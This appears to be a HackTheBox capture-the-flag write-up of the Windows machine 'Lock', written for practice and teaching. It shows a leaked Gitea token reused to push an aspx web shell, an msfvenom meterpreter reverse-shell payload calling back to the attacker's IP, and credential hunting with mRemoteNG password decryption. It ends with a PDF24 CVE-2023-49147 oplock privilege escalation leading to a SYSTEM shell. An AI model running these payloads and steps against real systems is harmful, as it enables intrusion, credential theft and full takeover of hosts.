---
title: Lock - Exposed Personal Access Token to aspx web shell and CVE
date: 2025-12-14 00:00:00 +0000
categories: [HackTheBox Writeups]
tags: [hackthebox, windows]
---

```bash
ares@legion:~/Documents$ sudo nmap -sVC -A -T4 $target
Nmap scan report for 10.129.234.64 (10.129.234.64)
Host is up (0.051s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Lock - Index
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=9e6c046a4f8e7c65; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=Akr4ERJ-qGz9VGVGsmYujYV_5hc6MTc2MzgzODA0NjMzMzE5MjAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 22 Nov 2025 19:00:47 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=a27e65d90771cf83; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=M_heSCWe6JxZxv3DhWT-8V6yIDI6MTc2MzgzODA0NzgyOTI5NTQwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 22 Nov 2025 19:00:47 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2025-11-21T18:59:27
|_Not valid after:  2026-05-23T18:59:27
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-22T19:01:15+00:00
|_ssl-date: 2025-11-22T19:01:55+00:00; 0s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=11/22%Time=6922085E%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,36B8,"HTTP/1\.0\x20200\x20OK\r\nCache-Control
SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea
SF:=9e6c046a4f8e7c65;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cooki
SF:e:\x20_csrf=Akr4ERJ-qGz9VGVGsmYujYV_5hc6MTc2MzgzODA0NjMzMzE5MjAwMA;\x20
SF:Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Optio
SF:ns:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2022\x20Nov\x202025\x2019:00:47\x20
SF:GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme
SF:-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=devic
SF:e-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20
SF:cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:ap
SF:plication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlY
SF:SIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRf
SF:dXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8
SF:vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbm
SF:ciLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Meth
SF:od\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20G
SF:ET\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x20n
SF:o-transform\r\nSet-Cookie:\x20i_like_gitea=a27e65d90771cf83;\x20Path=/;
SF:\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=M_heSCWe6JxZxv3Dh
SF:WT-8V6yIDI6MTc2MzgzODA0NzgyOTI5NTQwMA;\x20Path=/;\x20Max-Age=86400;\x20
SF:HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x2
SF:0Sat,\x2022\x20Nov\x202025\x2019:00:47\x20GMT\r\nContent-Length:\x200\r
SF:\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-22T19:01:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   48.42 ms 10.10.14.1 (10.10.14.1)
2   52.75 ms 10.129.234.64 (10.129.234.64)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.83 seconds
```bash
http://10.129.234.64:3000 > download dev-scripts.git // Visist Commits > repos.py
![20251122210856.png](/assets/img/htb-writeups/Pasted image 20251122210856.png)

```
export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f
ares@legion:~/HackTheBox/Lock$ python3 repos.py http://10.129.234.64:3000
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```bash
We can commit to repo and add our own script 
```bash
git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git          
```
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.97 LPORT=4444 -f aspx > rev.aspx

sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.97; set LPORT 4444; run"
```bash
OR
https://github.com/BlackArch/webshells
cmdasp.aspx 

```bash
git config --global user.email "ellen.freeman"
git config --global user.name "ellen.freeman"
git add cmdasp.aspx 
git commit -m 'mhmmm donuts'   
git push 
```
```sql
Visit - http://10.129.234.64/cmdasp.aspx

Get-ChildItem .\ -Recurse | Select-String -Pattern "config|pass|password|conf|db|sql" -List

cd C:\Users\ellen.freeman\Documents & type config.xml
```
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```
```python
https://raw.githubusercontent.com/gquere/mRemoteNG_password_decrypt/refs/heads/master/mremoteng_decrypt.py

```bash
ares@legion:~/HackTheBox/Lock$ python3 decrypt.py config.xml             
Name: RDP/Gale
Hostname: Lock
Username: Gale.Dekarios
Password: ty8wnW9qCKDosXo6
```
```
xfreerdp3 /v:10.129.234.64 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6
```bash
![20251122223510.png](/assets/img/htb-writeups/Pasted image 20251122223510.png)

Privesc:
PDF24 CVE
https://sploitus.com/exploit?id=PACKETSTORM:176206
```bash
Proof of concept:  
-----------------  
1) Local Privilege Escalation via MSI installer (CVE-2023-49147)  
For the exploit to work, the PDF24 Creator has to be installed via the MSI file.  
Afterwards, any low-privileged user can run the following command to start the  
repair of PDF24 Creator and trigger the vulnerable actions without a UAC popup:  
  
msiexec.exe /fa <PATH TO INSTALLERFILE>\pdf24-creator-11.14.0-x64.msi  
  
At the very end of the repair process, the sub-process pdf24-PrinterInstall.exe gets  
called with SYSTEM privileges and performs a write action on the file  
"C:\Program Files\PDF24\faxPrnInst.log". This can be used by an attacker by simply  
setting an oplock on the file as soon as it gets read. To do that, one can use the  
'SetOpLock.exe' tool from "https://github.com/googleprojectzero/symboliclink-testing-tools"  
with the following parameters:  
```
```python

```bash
/home/ares/Documents/SymbolicLink-Testing-Tools
python3 -m http.server 5001

 curl http://10.10.14.97:5001/SetOpLock.exe -o SetOpLock.exe
```
```
PS C:\Users\gale.dekarios> .\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" -r

// another ps tab 
PS C:\_install> msiexec.exe /fa c:\_install\pdf24-creator-11.15.1-x64.msi
```bash
wait for new tab pop-up

![20251122224506.png](/assets/img/htb-writeups/Pasted image 20251122224506.png)

![20251122224536.png](/assets/img/htb-writeups/Pasted image 20251122224536.png)
![20251122224551.png](/assets/img/htb-writeups/Pasted image 20251122224551.png)

![20251122224607.png](/assets/img/htb-writeups/Pasted image 20251122224607.png)
Once browser opens > CTRL + O
cmd.exe in file explorer > admin cli

